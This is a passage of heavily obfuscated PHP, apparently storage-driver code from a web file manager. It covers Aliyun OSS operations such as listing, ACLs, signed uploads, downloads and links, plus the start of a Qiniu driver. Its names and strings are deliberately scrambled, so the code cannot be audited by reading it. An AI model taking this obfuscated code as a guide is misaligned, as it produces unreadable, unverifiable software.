$_SERVER[ùèÅ´Ãš]; $’ˆ˜‹ë¯ = array($­ÑÌ½¨[32] => $this->pathThis($›Ö¼Êç¼), $­ÑÌ½¨[87] => $this->getPathOuter($­ÑÌ½¨[8] . $›Ö¼Êç¼), $­ÑÌ½¨[33] => $­ÑÌ½¨[78]); if ($¸ğ¤Èñ) { return $’ˆ˜‹ë¯; } $’ˆ˜‹ë¯[$­ÑÌ½¨[234]] = $’ˆ˜‹ë¯[$­ÑÌ½¨[88]] = 0; $’ˆ˜‹ë¯[$­ÑÌ½¨[235]] = $’ˆ˜‹ë¯[$­ÑÌ½¨[236]] = !0; if (empty($¡˜ƒ¾»)) { $›Ö¼Êç¼ = rtrim($›Ö¼Êç¼, $­ÑÌ½¨[8]) . $­ÑÌ½¨[8]; $²–Ø“Ö‹ = $this->objectMeta($›Ö¼Êç¼); if (!$²–Ø“Ö‹) { return $’ˆ˜‹ë¯; } $¡˜ƒ¾» = array($­ÑÌ½¨[234] => $²–Ø“Ö‹[$­ÑÌ½¨[579]][$­ÑÌ½¨[1504]], $­ÑÌ½¨[88] => strtotime($²–Ø“Ö‹[$­ÑÌ½¨[1501]])); } if (isset($¡˜ƒ¾»[$­ÑÌ½¨[88]])) { $’ˆ˜‹ë¯[$­ÑÌ½¨[88]] = $¡˜ƒ¾»[$­ÑÌ½¨[88]]; } if (isset($¡˜ƒ¾»[$­ÑÌ½¨[234]])) { $’ˆ˜‹ë¯[$­ÑÌ½¨[234]] = $¡˜ƒ¾»[$­ÑÌ½¨[234]]; } return $’ˆ˜‹ë¯; } public function listPath($—å×…Õí, $´èÀ¿°Ê = false) { $Ì Ğ£‚§ =& $_SERVER[ùèÅ´Ãš]; $»ñ£¶Œ† = $this->fileList($—å×…Õí, $Ì Ğ£‚§[8], !0); foreach ($»ñ£¶Œ†[$Ì Ğ£‚§[85]] as $ÇÅÇÃËœ => $ÏÀÀ´ÁØ) { $»ñ£¶Œ†[$Ì Ğ£‚§[85]][$ÇÅÇÃËœ] = $this->folderInfo($ÏÀÀ´ÁØ, $´èÀ¿°Ê, $ÏÀÀ´ÁØ); } foreach ($»ñ£¶Œ†[$Ì Ğ£‚§[86]] as $ÇÅÇÃËœ => $ÏÀÀ´ÁØ) { $»ñ£¶Œ†[$Ì Ğ£‚§[86]][$ÇÅÇÃËœ] = $this->fileInfo($ÏÀÀ´ÁØ[$Ì Ğ£‚§[32]], $´èÀ¿°Ê, $ÏÀÀ´ÁØ); } return $»ñ£¶Œ†; } protected function infoChildren($’®Ï ê, &$˜’Ğäº‹) { $˜²Öœíö =& $_SERVER[ùèÅ´Ãš]; $Òı×Ì¹ò = $this->fileList($’®Ï ê, $˜²Öœíö[12], !0); $˜’Ğäº‹[$˜²Öœíö[81]] += count($Òı×Ì¹ò[$˜²Öœíö[85]]); $˜’Ğäº‹[$˜²Öœíö[80]] += count($Òı×Ì¹ò[$˜²Öœíö[86]]); foreach ($Òı×Ì¹ò[$˜²Öœíö[86]] as $å´¨Ÿß¾) { if (!$å´¨Ÿß¾ || !$å´¨Ÿß¾[$˜²Öœíö[79]]) { continue; } $˜’Ğäº‹[$˜²Öœíö[79]] += $å´¨Ÿß¾[$˜²Öœíö[79]]; } } public function has($Ö‚€ÃÕô, $¯Ïıû‡ù = false, $™”¦¯Ë¾ = true) { $ÛåÛÙ¦• =& $_SERVER[ùèÅ´Ãš]; $Ö‚€ÃÕô = trim($Ö‚€ÃÕô, $ÛåÛÙ¦•[8]); $Ë‹Ÿ£ÍÃ = empty($Ö‚€ÃÕô) && $Ö‚€ÃÕô !== $ÛåÛÙ¦•[231] ? $ÛåÛÙ¦•[12] : $Ö‚€ÃÕô . $ÛåÛÙ¦•[8]; $õ«œÖÄ— = $ÛåÛÙ¦•[12]; $ ½Ñãó‹ = 500; $À¨ÃêÌ = $ìÀê†ğÉ = 0; while (!0) { check_abort(); $¾Êî­¨¿ = array($ÛåÛÙ¦•[1495] => $ÛåÛÙ¦•[8], $ÛåÛÙ¦•[1496] => $Ë‹Ÿ£ÍÃ, $ÛåÛÙ¦•[1497] => $ ½Ñãó‹, $ÛåÛÙ¦•[1498] => $õ«œÖÄ—); try { $¹­„Á¹Ã = $this->client->listObjects($this->bucket, $¾Êî­¨¿); } catch (OSS\Core\OssException $Ö˜¹äÔ) { $this->writeLog(__FUNCTION__ . $ÛåÛÙ¦•[215] . $Ö˜¹äÔ->getMessage()); break; } $õ«œÖÄ— = $¹­„Á¹Ã->getNextMarker(); $ê‚û¥òé = $¹­„Á¹Ã->getObjectList(); $Ã¿…³ÑÄ = $¹­„Á¹Ã->getPrefixList(); if ($¯Ïıû‡ù) { if (count($ê‚û¥òé) > 1 || count($ê‚û¥òé) == 1 && $ê‚û¥òé[0]->getKey() != $Ë‹Ÿ£ÍÃ) { $À¨ÃêÌ += count($ê‚û¥òé) - 1; } if (!empty($Ã¿…³ÑÄ)) { $ìÀê†ğÉ += count($Ã¿…³ÑÄ); } if ($õ«œÖÄ— === $ÛåÛÙ¦•[12]) { break; } continue; } if ($™”¦¯Ë¾) { if (!empty($ê‚û¥òé)) { if (count($ê‚û¥òé) > 1 || $ê‚û¥òé[0]->getKey() != $Ë‹Ÿ£ÍÃ) { return !0; } } } else { if (!empty($Ã¿…³ÑÄ)) { return !0; } } if ($õ«œÖÄ— === $ÛåÛÙ¦•[12]) { break; } } if ($¯Ïıû‡ù) { return array($ÛåÛÙ¦•[242] => $À¨ÃêÌ, $ÛåÛÙ¦•[243] => $ìÀê†ğÉ); } return !1; } public function listAll($×í¦ÛÑ‘) { $„ˆ¢ØÊÀ =& $_SERVER[ùèÅ´Ãš]; $»àÛ…û = $this->fileList($×í¦ÛÑ‘, $„ˆ¢ØÊÀ[12], !0); $Ğ‹³ÈÇÏ = array_to_keyvalue($»àÛ…û[$„ˆ¢ØÊÀ[86]], $„ˆ¢ØÊÀ[32]); foreach ($»àÛ…û[$„ˆ¢ØÊÀ[85]] as $úäåíºì) { if (is_string($úäåíºì)) { $Ğ‹³ÈÇÏ[$úäåíºì] = array($„ˆ¢ØÊÀ[79] => 0); } } return $this->listAllFiles($×í¦ÛÑ‘, $Ğ‹³ÈÇÏ); } public function canRead($«‚±Ö¬¦) { $Åƒœ¿‰Ù =& $_SERVER[ùèÅ´Ãš]; $Ê Æáµú = $this->pathAcl($«‚±Ö¬¦); return $Ê Æáµú == $Åƒœ¿‰Ù[1505] || $Ê Æáµú == $Åƒœ¿‰Ù[626] ? !0 : !1; } public function canWrite($§Ä×Øïº) { $Ä¿÷‡Úó = $this->pathAcl($§Ä×Øïº); return $Ä¿÷‡Úó == $_SERVER[ùèÅ´Ãš][626] ? !0 : !1; } public function pathAcl($Â‹¢¸å€) { $ÛËõ¶èˆ =& $_SERVER[ùèÅ´Ãš]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ …†¨¨Œ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Â‹¢¸å€)); } catch (OSS\Core\OssException $×‘ÀÏõ¶) { $this->writeLog(__FUNCTION__ . $ÛËõ¶èˆ[215] . $×‘ÀÏõ¶->getMessage()); return !1; } $¶¢Ç°ú¦ = $ …†¨¨Œ == $ÛËõ¶èˆ[37] ? $this->bucketAcl : $ …†¨¨Œ; if ($¶¢Ç°ú¦ == $ÛËõ¶èˆ[1506]) { return $ÛËõ¶èˆ[1505]; } if ($¶¢Ç°ú¦ == $ÛËõ¶èˆ[1507]) { return $ÛËõ¶èˆ[626]; } return $¶¢Ç°ú¦; } private function chmodPath($ı°˜™– , $ÉÂ¬¬šç = '') { $‰«¡×ĞÚ =& $_SERVER[ùèÅ´Ãš]; $­ıŸ‚Š = empty($ÉÂ¬¬šç) ? $‰«¡×ĞÚ[1507] : $ÉÂ¬¬šç; $°Øà‹²¶ = array($‰«¡×ĞÚ[37], $‰«¡×ĞÚ[232], $‰«¡×ĞÚ[1506], $‰«¡×ĞÚ[1507]); if (!in_array($­ıŸ‚Š, $°Øà‹²¶)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ı°˜™– ), $­ıŸ‚Š); } catch (OSS\Core\OssException $‡Çƒò”™) { $this->writeLog(__FUNCTION__ . $‰«¡×ĞÚ[215] . $‡Çƒò”™->getMessage()); return !1; } return !0; } public function getContent($“¤Ãœü÷) { return $this->fileSubstr($“¤Ãœü÷, -1); } public function setContent($—Ûö™ˆ·, $¤¶ÙáÇ = '') { $¤È¸‚õ• =& $_SERVER[ùèÅ´Ãš]; try { $€£ë¹›ò = $this->trafficLimit($¤È¸‚õ•[1508]); $üŠğ™è¯ = $this->client->putObject($this->bucket, $this->pathEncode($—Ûö™ˆ·), $¤¶ÙáÇ, $€£ë¹›ò); } catch (OSS\Core\OssException $íÖÍˆú¤) { $this->writeLog(__FUNCTION__ . $¤È¸‚õ•[215] . $íÖÍˆú¤->getMessage()); return !1; } $¿¸ı”± = array($¤È¸‚õ•[1502] => trim($üŠğ™è¯[$¤È¸‚õ•[1499]], $¤È¸‚õ•[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($—Ûö™ˆ·))); $this->updateObjMeta($—Ûö™ˆ·, $¿¸ı”±); return isset($üŠğ™è¯[$¤È¸‚õ•[1509]][$¤È¸‚õ•[297]]) ? !0 : !1; } private function updateObjMeta($É“¨ßæ¼, $ó¥¹©²—) { $É“¨ßæ¼ = $this->pathEncode($É“¨ßæ¼); try { $âÈ½ˆï× = array(OSS\OssClient::OSS_HEADERS => $ó¥¹©²—); $this->client->copyObject($this->bucket, $É“¨ßæ¼, $this->bucket, $É“¨ßæ¼, $âÈ½ˆï×); } catch (OSS\Core\OssException $ıÈ‚éçÊ) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][215] . $ıÈ‚éçÊ->getMessage()); return !1; } return !0; } public function upload($ŸĞ‹Ş, $¤—ÒÈ§, $Â«şÆç = false, $½®˜²¸’ = REPEAT_REPLACE) { $§ğÔËùå =& $_SERVER[ùèÅ´Ãš]; $Š¾Ä²öÎ = trim($ŸĞ‹Ş, $§ğÔËùå[8]); $õÙ¼Úˆ« = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($§ğÔËùå[1502] => @md5_file($¤—ÒÈ§)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ŸĞ‹Ş))); $õÙ¼Úˆ« = $this->trafficLimit($§ğÔËùå[1508], $õÙ¼Úˆ«); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Š¾Ä²öÎ), $¤—ÒÈ§, $õÙ¼Úˆ«); } catch (OSS\Core\OssException $–Í§Ğ·) { $this->writeLog(__FUNCTION__ . $§ğÔËùå[215] . $–Í§Ğ·->getMessage()); return !1; } return $this->getPathOuter($ŸĞ‹Ş); } public function getHost() { $ìš¥Ş«– =& $_SERVER[ùèÅ´Ãš]; $­ Ôá¶ = explode($ìš¥Ş«–[211], parent::getHost()); return $­ Ôá¶[0] . $ìš¥Ş«–[211] . $this->bucket . $ìš¥Ş«–[10] . $­ Ôá¶[1]; } public function uploadFormData($¹„±™‚˜, $œä´–Ó® = 3600) { $£”¹¬ƒ— =& $_SERVER[ùèÅ´Ãš]; if (!($›î¸ö² = $this->getHost())) { return !1; } $’‚Ğ’ÄŸ = $œä´–Ó®; $”İæ¨·ñ = date($£”¹¬ƒ—[1510], time() + $’‚Ğ’ÄŸ); $©¤ãŞ¥ = new DateTime($”İæ¨·ñ); $½èŠßş = $©¤ãŞ¥->format(DateTime::ISO8601); $†Ó“êêä = strpos($½èŠßş, $£”¹¬ƒ—[373]); $½èŠßş = substr($½èŠßş, 0, $†Ó“êêä) . $£”¹¬ƒ—[1511]; $„ÉÕÂ = 1048576000 * 5; $àª¬êÀ = $this->pathFather($¹„±™‚˜); $†Òéù¶Ø = array($£”¹¬ƒ—[265] => $½èŠßş, $£”¹¬ƒ—[268] => array(array($£”¹¬ƒ—[1512], 0, $„ÉÕÂ), array($£”¹¬ƒ—[270], $£”¹¬ƒ—[271], $àª¬êÀ))); $è‘µ¤­· = base64_encode(json_encode($†Òéù¶Ø)); $³ÂĞé¦› = base64_encode(hash_hmac($£”¹¬ƒ—[1433], $è‘µ¤­·, $this->secret, !0)); $—×ïûª‹ = array($£”¹¬ƒ—[1513] => $this->accessKey, $£”¹¬ƒ—[280] => $è‘µ¤­·, $£”¹¬ƒ—[273] => $£”¹¬ƒ—[264], $£”¹¬ƒ—[1514] => $³ÂĞé¦›, $£”¹¬ƒ—[209] => $›î¸ö²); $—×ïûª‹ = $this->trafficLimit($£”¹¬ƒ—[1508], $—×ïûª‹, !0); return $—×ïûª‹; } public function uploadMultiData($İÉ¯ñ”, $¼‹¸„¯Õ = 3600) { $¨È‘ÄÙ„ =& $_SERVER[ùèÅ´Ãš]; if (!($Ä‚ë³½Å = $this->getHost())) { return !1; } $öÂÏë‚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($İÉ¯ñ”)); return array($¨È‘ÄÙ„[284] => $öÂÏë‚, $¨È‘ÄÙ„[209] => $Ä‚ë³½Å . $¨È‘ÄÙ„[8] . $this->pathEncode($İÉ¯ñ”), $¨È‘ÄÙ„[285] => gmdate($¨È‘ÄÙ„[1515]), $¨È‘ÄÙ„[97] => $İÉ¯ñ”); } public function uploadMultiAuth($‚«Ï‘ïÜ, $ªÊú¾ä = array()) { if (isset($ªÊú¾ä[$_SERVER[ùèÅ´Ãš][286]])) { return $this->uploadPartAuth($‚«Ï‘ïÜ, $ªÊú¾ä); } return $this->uploadListAuth($‚«Ï‘ïÜ, $ªÊú¾ä); } private function uploadPartAuth($İ›Î©Ø’, $”“ãıŠ = array()) { $şÙò¾ş¾ =& $_SERVER[ùèÅ´Ãš]; $‚³ÙÕÁÏ = $”“ãıŠ[$şÙò¾ş¾[97]]; $ô¨¿ğûÉ = $this->_getUploadAuth($‚³ÙÕÁÏ, $”“ãıŠ); $½Ëã‚ = array($şÙò¾ş¾[289] => $ô¨¿ğûÉ[$şÙò¾ş¾[289]], $şÙò¾ş¾[285] => $ô¨¿ğûÉ[$şÙò¾ş¾[285]]); if (isset($ô¨¿ğûÉ[$şÙò¾ş¾[1516]])) { $½Ëã‚[$şÙò¾ş¾[1516]] = $ô¨¿ğûÉ[$şÙò¾ş¾[1516]]; } return $½Ëã‚; } private function uploadListAuth($¼äºåĞÉ, $ï €Ğ¾ = array()) { $‚›ÏÍø =& $_SERVER[ùèÅ´Ãš]; $—êîıˆ = $ï €Ğ¾[$‚›ÏÍø[97]]; $ëÄì˜ Ê = $ï €Ğ¾[$‚›ÏÍø[284]]; $ª“ÅÒçÈ = $this->client->listParts($this->bucket, $this->pathEncode($—êîıˆ), $ëÄì˜ Ê); $Òã§Âù­ = $ª“ÅÒçÈ->getListPart(); $Á§Ì· = array(); foreach ($Òã§Âù­ as $°±ü¸”) { $Á§Ì·[] = array($‚›ÏÍø[300] => $°±ü¸”->getPartNumber(), $‚›ÏÍø[301] => trim($°±ü¸”->getETag(), $‚›ÏÍø[121])); } if (!$Á§Ì·) { return !1; } $§¹óä–÷ = $this->_getUploadAuth($—êîıˆ, $ï €Ğ¾); return array($‚›ÏÍø[289] => $§¹óä–÷[$‚›ÏÍø[289]], $‚›ÏÍø[285] => $§¹óä–÷[$‚›ÏÍø[285]], $‚›ÏÍø[292] => $Á§Ì·); } private function _getUploadAuth($ûèı¡Şô, $å­ğğò) { $öèñÙ =& $_SERVER[ùèÅ´Ãš]; $éŠó×â = gmdate($öèñÙ[1515]); $›¤®£éÈ = isset($å­ğğò[$öèñÙ[286]]) ? $öèñÙ[256] : $öèñÙ[291]; $ØËƒÅ¨ø = array_intersect_key($å­ğğò, array_flip(array($öèñÙ[286], $öèñÙ[284]))); ksort($ØËƒÅ¨ø); $€ã¸Òœ” = $ØËƒÅ¨ø ? $öèñÙ[76] . http_build_query($ØËƒÅ¨ø, null, $öèñÙ[287], PHP_QUERY_RFC3986) : $öèñÙ[12]; $¯‘¥Šäé = array($›¤®£éÈ, $öèñÙ[12], $öèñÙ[123], $éŠó×â, "\x78\x2d\x6f\163\x73\x2d\144\141\164\x65\72{$éŠó×â}", $öèñÙ[8] . $this->bucket . $öèñÙ[8] . $ûèı¡Şô . $€ã¸Òœ”); if (isset($å­ğğò[$öèñÙ[286]])) { $¢î¢Ö† = $this->trafficLimit($öèñÙ[1508], array(), !0); if ($¢î¢Ö†) { $ûèı¡Şô = $öèñÙ[1516]; array_splice($¯‘¥Šäé, 5, 0, $ûèı¡Şô . $öèñÙ[4] . $¢î¢Ö†[$ûèı¡Şô]); } } $úææ‹Ö = implode($öèñÙ[288], $¯‘¥Šäé); $‰İÉÍ—Ã = base64_encode(hash_hmac($öèñÙ[1433], $úææ‹Ö, $this->secret, !0)); $êÏÇÖ’˜ = $öèñÙ[1485] . $this->accessKey . $öèñÙ[4] . $‰İÉÍ—Ã; $èº´¼˜ = array($öèñÙ[289] => $êÏÇÖ’˜, $öèñÙ[285] => $éŠó×â); if (!empty($¢î¢Ö†)) { $èº´¼˜ = array_merge($èº´¼˜, $¢î¢Ö†); } return $èº´¼˜; } public function download($» Ûß÷Š, $·Ì†‘ô) { $›ëâÃõ¿ =& $_SERVER[ùèÅ´Ãš]; if ($this->isFolder($» Ûß÷Š)) { return !1; } try { $”ÎèÇƒ• = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $·Ì†‘ô); $”ÎèÇƒ• = $this->trafficLimit($›ëâÃõ¿[112], $”ÎèÇƒ•); $this->client->getObject($this->bucket, $this->pathEncode($» Ûß÷Š), $”ÎèÇƒ•); } catch (OSS\Core\OssException $ó‡åğÖ¦) { $this->writeLog(__FUNCTION__ . $›ëâÃõ¿[215] . $ó‡åğÖ¦->getMessage()); return !1; } return $·Ì†‘ô; } public function fileSubstr($Æëëò ¾, $Ë½ÜìÓ = 0, $ÎËÀˆšç = false) { if ($Ë½ÜìÓ === -1) { $”€™Ÿ‡“ = array(); } else { if ($ÎËÀˆšç === !1) { $¸şÛ¡•Ï = $this->size($Æëëò ¾); } else { $¸şÛ¡•Ï = $Ë½ÜìÓ + $ÎËÀˆšç - 1; } $”€™Ÿ‡“ = array(OSS\OssClient::OSS_RANGE => "{$Ë½ÜìÓ}\55{$¸şÛ¡•Ï}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Æëëò ¾), $”€™Ÿ‡“); } catch (OSS\Core\OssException $òé˜ÔÒÅ) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][215] . $òé˜ÔÒÅ->getMessage()); think_exception($òé˜ÔÒÅ->getMessage()); return !1; } } private function trafficLimit($Æ³£Àçí, $¥÷¼ˆ–§ = array(), $²š¡‡“¼ = false) { $†•—ŠìÆ =& $_SERVER[ùèÅ´Ãš]; if ($Æ³£Àçí == $†•—ŠìÆ[1508] && $this->isUploadServer() || $Æ³£Àçí == $†•—ŠìÆ[112] && $this->isFileOutServer()) { return $¥÷¼ˆ–§; } $ÕáñªÄÉ = floatval($GLOBALS[$†•—ŠìÆ[6]][$†•—ŠìÆ[92]][$†•—ŠìÆ[110]][$Æ³£Àçí]) * 1024 * 1024 * 8; if (!$ÕáñªÄÉ) { return $¥÷¼ˆ–§; } $ÕáñªÄÉ = $ÕáñªÄÉ < 819200 ? 819200 : ($ÕáñªÄÉ > 838860800 ? 838860800 : $ÕáñªÄÉ); if ($²š¡‡“¼) { $¥÷¼ˆ–§[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÕáñªÄÉ); } else { if (!isset($¥÷¼ˆ–§[OSS\OssClient::OSS_HEADERS])) { $¥÷¼ˆ–§[OSS\OssClient::OSS_HEADERS] = array(); } $¥÷¼ˆ–§[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÕáñªÄÉ); } return $¥÷¼ˆ–§; } public function link($¨áí‘³, $Ö«Àß˜Ò = array()) { $Œ³òêŞ¾ =& $_SERVER[ùèÅ´Ãš]; if (!$this->exist($¨áí‘³) || $this->isFolder($¨áí‘³)) { return !1; } try { $Ö«Àß˜Ò = $this->trafficLimit($Œ³òêŞ¾[112], $Ö«Àß˜Ò, !0); $˜úµÊ¼µ = $this->client->signUrl($this->bucket, $this->pathEncode($¨áí‘³), 3600 * 12, $Œ³òêŞ¾[1517], $Ö«Àß˜Ò); return $this->getCdnLink($˜úµÊ¼µ); } catch (OSS\Core\OssException $Â¢îÊÔ) { $this->writeLog(__FUNCTION__ . $Œ³òêŞ¾[215] . $Â¢îÊÔ->getMessage()); return !1; } } public function fileOut($Æ•Âû£, $½ôåÏ = false, $ìé¾­Ó¿ = false, $×ßíÌÀĞ = '') { $å€¢ › =& $_SERVER[ùèÅ´Ãš]; if ($this->isFileOutServer()) { return $this->fileOutServer($Æ•Âû£, $½ôåÏ, $ìé¾­Ó¿, $×ßíÌÀĞ); } if (!$ìé¾­Ó¿) { $ìé¾­Ó¿ = $this->pathThis($Æ•Âû£); } $ìé¾­Ó¿ = rawurlencode($ìé¾­Ó¿); $´éÄÑ‚“ = get_file_mime(get_path_ext($ìé¾­Ó¿)); if ($´éÄÑ‚“ == $å€¢ ›[251]) { return parent::fileOut($Æ•Âû£, $½ôåÏ, $ìé¾­Ó¿, $×ßíÌÀĞ); } $½ôåÏ = $½ôåÏ ? $å€¢ ›[1518] : $å€¢ ›[1519]; $Õä•†æ¼ = array(OSS\OssClient::OSS_SUB_RESOURCE => $å€¢ ›[1520] . rawurlencode("{$½ôåÏ}\x3b\x66\x69\x6c\145\156\x61\155\145\75{$ìé¾­Ó¿}")); $¼öŸÚä„ = $this->link($Æ•Âû£, $Õä•†æ¼); $this->fileOutLink($¼öŸÚä„); } public function fileOutServer($ çÅšñ, $¨­¬ÍéÃ = false, $„ƒ°†ãÎ = false, $èí÷Ì±— = '') { parent::fileOut($ çÅšñ, $¨­¬ÍéÃ, $„ƒ°†ãÎ, $èí÷Ì±—); } public function fileOutImage($õÕ•ƒı, $…ë…™İ = 250) { if ($this->size($õÕ•ƒı) > 1024 * 1024 * 20) { return $this->fileOutImageServer($õÕ•ƒı, $…ë…™İ); } $ £ì™’ï = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ùèÅ´Ãš][1482] . $…ë…™İ); $’£ùã  = $this->link($õÕ•ƒı, $ £ì™’ï); $this->fileOutLink($’£ùã ); } public function fileOutImageServer($½ú±éíß, $ÍÎ¥²Ì× = 250) { parent::fileOutImage($½ú±éíß, $ÍÎ¥²Ì×); } public function fileOutLink($Ã——ÒÓ‹) { $–ëÕ¥¢œ =& $_SERVER[ùèÅ´Ãš]; if (!$this->isCdnHost() && substr($Ã——ÒÓ‹, 0, 7) == $–ëÕ¥¢œ[219]) { $Ã——ÒÓ‹ = $–ëÕ¥¢œ[220] . substr($Ã——ÒÓ‹, 7); } header($–ëÕ¥¢œ[175] . $Ã——ÒÓ‹); die; } public function hashMd5($·‡É°ØŒ, $ïÅÆ¿äó = '') { $À”¶ïºº =& $_SERVER[ùèÅ´Ãš]; $ÛØ´ô¬¡ = $this->_objectMeta($·‡É°ØŒ); if (!$ÛØ´ô¬¡) { return $À”¶ïºº[12]; } if (!isset($ÛØ´ô¬¡[$À”¶ïºº[1502]]) && !empty($ïÅÆ¿äó)) { $ö³Áôº¤ = $this->updateObjMeta($·‡É°ØŒ, array($À”¶ïºº[1502] => $ïÅÆ¿äó)); $ÛØ´ô¬¡[$À”¶ïºº[1502]] = $ö³Áôº¤ ? $ïÅÆ¿äó : $À”¶ïºº[12]; } return isset($ÛØ´ô¬¡[$À”¶ïºº[1502]]) ? strtolower($ÛØ´ô¬¡[$À”¶ïºº[1502]]) : $À”¶ïºº[12]; } public function size($¡™ö¾­•) { $›ùùªñŠ = $this->objectMeta($¡™ö¾­•); return $›ùùªñŠ ? $›ùùªñŠ[$_SERVER[ùèÅ´Ãš][79]] : 0; } public function info($·ÑÛ×ô) { if ($this->isFolder($·ÑÛ×ô)) { return $this->folderInfo($·ÑÛ×ô); } else { if ($this->isFile($·ÑÛ×ô)) { return $this->fileInfo($·ÑÛ×ô); } } return !1; } public function exist($ÈáÛ¶ùú) { return $this->isFile($ÈáÛ¶ùú) || $this->isFolder($ÈáÛ¶ùú); } public function isFile($ÙÀ›…’) { return !$this->isFolder($ÙÀ›…’) && $this->objectMeta($ÙÀ›…’); } public function isFolder($Ğ‹ÎÑÑÂ) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][180], $Ğ‹ÎÑÑÂ); } protected function objectMeta($Ï¬·Šı‘) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][182], $Ï¬·Šı‘); } protected function _objectMeta($Àú©Èï¥) { $Ä–‡ÈùÚ =& $_SERVER[ùèÅ´Ãš]; try { $éù…ƒ×š = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Àú©Èï¥)); } catch (OSS\Core\OssException $êàˆ×°­) { $this->writeLog(__FUNCTION__ . $Ä–‡ÈùÚ[215] . $êàˆ×°­->getMessage()); $éù…ƒ×š = !1; } if ($éù…ƒ×š) { $éù…ƒ×š[$Ä–‡ÈùÚ[79]] = intval($éù…ƒ×š[$Ä–‡ÈùÚ[1500]]); } return $éù…ƒ×š; } protected function _isFolder($‚­’×—) { $èó®¿ò =& $_SERVER[ùèÅ´Ãš]; if ($‚­’×— == $èó®¿ò[12] || $‚­’×— == $èó®¿ò[8]) { return !0; } $ÏŠÇ²¨Ë = array($èó®¿ò[1495] => $èó®¿ò[8], $èó®¿ò[1496] => rtrim($‚­’×—, $èó®¿ò[8]) . $èó®¿ò[8], $èó®¿ò[1497] => 1, $èó®¿ò[1498] => $èó®¿ò[12]); $¡’–ªùÒ = $this->client->listObjects($this->bucket, $ÏŠÇ²¨Ë); if ($¡’–ªùÒ->getObjectList() || $¡’–ªùÒ->getPrefixList()) { return !0; } return !1; } public function writeLog($š©›¯ôç = '', $¹µ‡Œ×„ = false) { $ÖŠæğ² =& $_SERVER[ùèÅ´Ãš]; $ÉëçŞ®ˆ = in_array(ACTION, array($ÖŠæğ²[213], $ÖŠæğ²[214])); if (!$ÉëçŞ®ˆ && !GLOBAL_DEBUG) { return; } $«Æ• Ÿ‹ = 0; if (stripos($š©›¯ôç, $ÖŠæğ²[1521]) !== !1) { $«Æ• Ÿ‹ = 1; $µ… Å†’ = explode($ÖŠæğ²[1522], $š©›¯ôç); $š©›¯ôç = !empty($µ… Å†’[1]) ? $µ… Å†’[1] : $š©›¯ôç; } else { if (stripos($š©›¯ôç, $ÖŠæğ²[1523])) { $«Æ• Ÿ‹ = 2; $µ… Å†’ = explode($ÖŠæğ²[1523], $š©›¯ôç); $µ… Å†’ = explode($ÖŠæğ²[4], $µ… Å†’[0]); $š©›¯ôç = !empty($µ… Å†’[1]) ? $µ… Å†’[1] : $š©›¯ôç; } } if ($ÉëçŞ®ˆ && I18n::getType() == $ÖŠæğ²[1524]) { if ($«Æ• Ÿ‹ == 1) { $š©›¯ôç = str_replace($ÖŠæğ²[1525], $ÖŠæğ²[1526], $š©›¯ôç); } else { if ($«Æ• Ÿ‹ == 2) { $µ… Å†’ = explode($ÖŠæğ²[215], $µ… Å†’[0]); $¨Ãı‘…Õ = isset($µ… Å†’[1]) ? $µ… Å†’[1] : $ÖŠæğ²[12]; $´¦”Ï¤ö = array($ÖŠæğ²[1527] => $ÖŠæğ²[1528], $ÖŠæğ²[1529] => $ÖŠæğ²[1530], $ÖŠæğ²[1531] => $ÖŠæğ²[1532], $ÖŠæğ²[1533] => $ÖŠæğ²[1534], $ÖŠæğ²[1535] => $ÖŠæğ²[1536], $ÖŠæğ²[1537] => $ÖŠæğ²[1538], $ÖŠæğ²[1539] => $ÖŠæğ²[1540], $ÖŠæğ²[1541] => $ÖŠæğ²[1542], $ÖŠæğ²[1543] => $ÖŠæğ²[1544], $ÖŠæğ²[1545] => $ÖŠæğ²[1546]); if (isset($´¦”Ï¤ö[$¨Ãı‘…Õ])) { $š©›¯ôç = $´¦”Ï¤ö[$¨Ãı‘…Õ]; } } } if (stripos($š©›¯ôç, $ÖŠæğ²[1547])) { $š©›¯ôç = $ÖŠæğ²[1548]; } } if (!trim($š©›¯ôç)) { return; } parent::writeLog(trim($š©›¯ôç), $¹µ‡Œ×„); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($±Àİƒ†) { parent::__construct(); require_once SDK_DIR . $_SERVER[ùèÅ´Ãš][1549]; $this->_init($±Àİƒ†); } public function _init($‹ó¤´Æó) { $úõùş˜” =& $_SERVER[ùèÅ´Ãš]; $this->config = $‹ó¤´Æó; foreach ($‹ó¤´Æó as $É¢¤§§‰ => $Ÿ±½ÏÓ) { if (isset($this->{$É¢¤§§‰})) { $this->{$É¢¤§§‰} = $Ÿ±½ÏÓ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($úõùş˜”[1550] . LNG($úõùş˜”[1486])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($•ÑÄ–´Ù, $™¸ì©Æ = '', $ÍÕˆßª = REPEAT_RENAME) { if 